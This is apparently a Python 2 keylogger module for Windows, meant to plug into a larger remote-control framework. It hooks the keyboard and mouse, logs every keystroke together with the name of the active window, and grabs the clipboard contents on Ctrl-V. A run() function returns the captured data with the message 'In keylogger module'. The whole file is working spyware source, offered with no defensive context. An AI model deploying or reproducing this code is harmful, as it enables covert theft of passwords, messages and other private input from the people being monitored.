
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
    
import win32event, win32clipboard
import copy

data=""
current_window = None


def OnMouseEvent(event):
    global current_window, data

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        data=data+"[PROCESS]"+current_window

    # return True to pass the event to other handlers
    return True
   
def keypressed(event):
    global data
    
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)

    data=data+keys
    
    # if [Ctrl-V], get the value on the clipboard
    if event.Key == "V":
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        paste="[PASTE] - %s" % (pasted_value)
        data=data+paste

    # return True to pass the event to other handlers
    return True


# create and register a hook manager
hm = pyHook.HookManager()

hm.KeyDown = keypressed
hm.HookKeyboard()

hm.MouseAll = OnMouseEvent
hm.HookMouse()

pythoncom.PumpMessages()


def run(**args):
    global data

    copy=copy.copy(data)
    data=""
    
    print "[*] In keylogger module."
    return copy

